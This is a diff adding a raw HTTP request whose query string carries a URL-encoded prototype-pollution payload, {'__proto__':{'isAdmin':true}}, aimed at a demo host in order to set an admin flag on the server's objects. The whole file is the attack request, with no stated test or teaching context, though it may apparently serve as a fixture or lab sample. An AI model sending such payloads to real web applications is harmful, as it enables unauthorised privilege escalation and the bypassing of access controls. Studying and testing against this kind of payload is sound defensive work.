@@ -1,0 +1,4 @@
+GET /a?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
